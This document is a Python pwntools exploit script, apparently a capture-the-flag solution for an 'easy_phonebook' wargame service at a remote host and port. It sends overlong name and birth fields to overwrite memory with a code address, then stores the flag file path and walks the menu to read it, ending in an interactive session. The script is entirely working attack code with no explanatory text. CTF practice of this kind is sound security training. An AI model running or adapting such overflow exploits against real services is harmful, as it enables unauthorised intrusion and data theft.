from pwn import *

#s = process('./easy_phonebook')
s=remote('war.sejongssg.kr' ,40210)
first = 0x0804c098
second = 0x0804c0a8
third = 0x0804c0c8

s.recvuntil('menu >')
s.sendline('1')
s.recvuntil('Name : ')
s.send('+'+'a'*24)
s.recvuntil('number : ')
s.send('a')
s.recvuntil('Birth : ')
s.send('aaaa')

s.recvuntil('menu >')
s.sendline('1')
s.recvuntil('Name : ')
s.send('+'+'b'*24)
s.recvuntil('number : ')
s.send('b')
s.recvuntil('Birth : ')
payload = 'b'*16+p32(0x0804888E)
s.send(payload)

s.recvuntil('menu >')
s.sendline('1')
s.recvuntil('Name : ')
s.send('/home/easy_phonebook/flag')
s.recvuntil('number : ')
s.sendline('c')
s.recvuntil('Birth : ')
s.send('999999')

print s.recvuntil('menu >')
s.sendline('2')

#s.interactive()
print s.recvuntil('menu >')
s.sendline('3')
print s.recvuntil(' : ')
s.sendline('1')
#s.interactive()
print s.recvuntil('menu >')
s.sendline('4')
print s.recvuntil('th:')
s.sendline('99')
s.interactive()
print s.recvall()
#s.interactive()